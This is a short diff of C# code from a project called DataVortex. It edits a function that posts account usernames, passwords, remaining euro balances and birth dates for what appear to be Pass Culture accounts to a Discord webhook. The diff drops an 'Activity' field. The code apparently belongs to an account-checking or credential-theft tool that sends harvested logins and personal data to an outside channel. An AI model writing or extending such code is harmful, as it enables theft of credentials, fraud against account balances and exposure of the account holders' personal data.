@@ -58,7 +58,7 @@ namespace DataVortex
                     }
                 }
 
-                public static async Task SendToDiscordWebhookPassculture(List<(string url, string username, string password, string app)> results, string webhookUrl, string databaseName, string birthDate, double remaining1, string activity)
+                public static async Task SendToDiscordWebhookPassculture(List<(string url, string username, string password, string app)> results, string webhookUrl, string databaseName, string birthDate, double remaining1)
                 {
                     // Charger les comptes incorrects depuis le fichier "incorrect.txt"
                     LoadIncorrectAccountsFromFile("incorrect.txt");
@@ -122,7 +122,6 @@ namespace DataVortex
                                     // Créez une chaîne avec les détails du compte
                                     var sb = new StringBuilder();
                                     sb.AppendLine($"`{accountIdentifier}`");
-                                    sb.AppendLine($"\n**Activité:**\n {accountDetail.Activity}");
                                     sb.AppendLine($"\n**Montant restant:**\n {accountDetail.Remaining1} €");
                                     sb.AppendLine($"\n**Date de naissance:**\n {accountDetail.BirthDate}");
 
@@ -298,7 +297,6 @@ namespace DataVortex
                 {
                     public string Username { get; set; }
                     public string Password { get; set; }
-                    public string Activity { get; set; }
                     public string BirthDate { get; set; }
                     public double Remaining1 { get; set; }
                 }
